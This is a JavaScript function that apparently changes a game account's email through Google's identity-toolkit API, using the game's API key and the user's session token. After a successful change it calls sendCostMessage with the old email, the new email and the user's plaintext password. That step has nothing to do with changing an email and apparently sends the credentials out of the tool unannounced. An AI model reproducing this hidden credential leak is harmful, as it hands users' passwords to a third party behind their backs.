async function changeEmail(){
    if(!requireLogin()) return;
    const newEmail=prompt("Enter new email:"); if(!newEmail) return;
    try{
        const resp=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ idToken:currentToken,email:newEmail,returnSecureToken:true })
        });
        const data=await resp.json();
        if(data.email){ 
            const old=currentUser; 
            currentUser=data.email; 
            currentToken=data.idToken; 
            updateStatus(`✅ Email changed to ${currentUser}`,false,'serviceStatus'); 
            sendCostMessage(`📧 Change Email\nOld: ${old}\nNew: ${currentUser}\n🔒 Password: ${currentPassword}`); 
        }
        else updateStatus(`❌ Failed: ${data.error?.message||'Unknown'}`,true,'serviceStatus');
    }catch(err){ updateStatus(`❌ Error: ${err.message}`,true,'serviceStatus'); }
}